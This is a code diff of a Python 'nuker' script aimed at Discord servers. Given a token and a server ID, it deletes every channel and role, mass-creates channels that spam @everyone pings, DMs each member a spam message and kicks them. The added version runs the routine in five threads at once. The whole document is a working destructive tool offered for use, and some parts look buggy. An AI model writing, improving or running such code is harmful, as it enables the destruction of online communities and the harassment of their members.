@@ -1,81 +1,80 @@
-import httpx, time
+import time
+import httpx
+import json as json
+import threading
 
-class nuker:
-    def __init__(self):
-        self.session = httpx.Client()
-        self.token = input("enter your token: ")
-        self.checkToken()
-        self.guildID = int(input("enter guild id: "))
-        self.amount = int(input("how much channels/roles to create: "))
-        self.name = input("channels/roles name: ")
-        self.message = input("spam message: ")
-        
-    def checkToken(self):  # sourcery skip: raise-specific-error
-        self.session.headers= { "Authorization": self.token }
-        r = self.session.get('https://discord.com/api/v10/users/@me')
+
+def checkToken():  # sourcery skip: raise-specific-error
+        session.headers= { "Authorization": token }
+        r = session.get('https://discord.com/api/v10/users/@me')
         if r.status_code in list(range(200,300)):
-            self.isBot = False
+            isBot = False
         else:
-            self.session.headers= { "Authorization": f"Bot {self.token}" }
-            r = self.session.get('https://discord.com/api/v10/users/@me')
+            session.headers= { "Authorization": f"Bot {token}" }
+            r = session.get('https://discord.com/api/v10/users/@me')
             if r.status_code in list(range(200,300)):
-                self.isBot = True
+                isBot = True
             else:
-                raise Exception("Invalid Token noob")
+                raise Exception('Invalid Token')
+                
+session = httpx.Client()
+token = input("Bot Token: ")
+checkToken()
+guildID = input("Server ID: ")
+name = input("Channels/Roles Name: ")
+message = input("Spam Message: ")
 
-    
-    def deleteChannels(self):
-        channels = self.session.get(f'https://discord.com/api/guilds/{self.guildID}/channels').json()
-        for channel in channels:
-            r = self.session.delete(f'https://discord.com/api/v6/channels/{channel["id"]}')
-            if r.status_code in list(range(200,300)):
-                print(f"successfully deleted channel {channel['name']}")
-            else:
-                print(f"failed to delete channel {channel['name']}")
-            
-            
-    def deleteRoles(self):
-        roles = self.session.get(f'https://discord.com/api/guilds/{self.guildID}/roles').json()
+def deleteRoles():
+        roles = session.get(f'https://discord.com/api/guilds/{guildID}/roles').json()
         for role in roles:
-            r = self.session.delete(f'https://discord.com/api/v6/guilds/{self.guildID}/roles/{role["id"]}')
+            r = session.delete(f'https://discord.com/api/v6/guilds/{guildID}/roles/{role["id"]}')
             if r.status_code in list(range(200,300)):
-                print(f"successfully deleted role {role['name']}")
+                print(f"Successfully deleted role {role['name']}")
             else:
-                print(f"failed to delete role {role['name']}")
+                print(f"Failed to delete role {role['name']}")
             
-            
-    def createChannelsRoles(self):
-        for _ in range(self.amount):
-            r = self.session.post(f'https://discord.com/api/v6/guilds/{self.guildID}/channels',json={"type":0,"name":self.name,"permission_overwrites":[]})
-            
+def delchannel():
+    channels = session.get(f"https://discord.com/api/v9/guilds/{guildID}/channels", headers={"Authorization": f"Bot {token}"}).json()
+    for channel in channels:
+                s = session.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers={"Authorization": f"Bot {token}"})
+                if s.status_code == 200:
+                    print(f"Deleted {channel['id']}")
+                elif "retry_after" in s.text:
+                    print("Ratelimited" + s.json()['retry_after'])
+                    time.sleep(float(s.json()['retry_after']))
+                elif "Missing Permissions" in s.text:
+                    print("Missing Permissions", channel)
+
+    pass
+
+def spamchannels():
+        for _ in range(100):
+            r = session.post(f'https://discord.com/api/v6/guilds/{guildID}/channels',json={"type":0,"name":name,"permission_overwrites":[]})
             if r.status_code in list(range(200,300)):
-                print(f"successfully created channel {self.name}")
-                self.session.post(f'https://discord.com/api/v6/channels/{r.json()["id"]}/messages',json={"content":f'@everyone {self.name}',"tts":False})
+                print(f"Successfully created channel {name}")
+                for _ in range(int(5)):
+                    session.post(f'https://discord.com/api/v6/channels/{r.json()["id"]}/messages',json={"content":f'@everyone {name}',"tts":False})
+                    time.sleep(0)
             else:
-                print("cant create channel")
-            
-            r = self.session.post(f'https://discord.com/api/v6/guilds/{self.guildID}/roles',json={"name":self.name})
-            if r.status_code in list(range(200,300)):
-                print(f"successfully created role {self.name}")
-            else:
-                print("cant create role")
-            
+                print("Couldn't create channel")
     
-    def DMkickAll(self):
-        members=self.session.get(f'https://discord.com/api/v6/guilds/{self.guildID}/members').json()
+def DMkickAll():
+        members=session.get(f'https://discord.com/api/v6/guilds/{guildID}/members').json()
         for member in members:
-            m=self.session.post('https://discord.com/api/v6/users/@me/channels',json={"recipients":[member["id"],]}).json() # opens the dm
-            self.session.post(f'https://discord.com/api/v6/channels/{member["id"]}/messages',json={"content":f"@everyone {self.message}","tts":False})
-            self.session.delete(f'https://discord.com/api/v6/guilds/{self.guildID}/members/{member["id"]}')
-            print(f"dm and kicked {member['name']}#{member['discriminator']}")
-    
-    def nuke(self):
-        self.deleteChannels()
-        self.deleteRoles()
-        self.createChannelsRoles()
-        if self.isBot:
-            self.DMkickAll()
-        else:
-            print("cant kick/dm all with user account (bot account required) just do it manually for safety reasons fr")
-        
-nuker().nuke()
+            session.post('https://discord.com/api/v6/users/@me/channels',json={"recipients":[member["id"],]}).json() # opens the dm
+            session.post(f'https://discord.com/api/v6/channels/{member["id"]}/messages',json={"content":f"@everyone {message}","tts":False})
+            time.sleep(1)
+            session.delete(f'https://discord.com/api/v6/guilds/{guildID}/members/{member["id"]}')
+            print(f"Messaged & Kicked {member['name']}#{member['discriminator']}")
+
+def nuke():
+    delchannel()
+    deleteRoles()
+    spamchannels()
+    DMkickAll()
+
+threads = []
+for i in range(int(5)):
+    t = threading.Thread(target=nuke)
+    t.start()
+    threads.append(t)
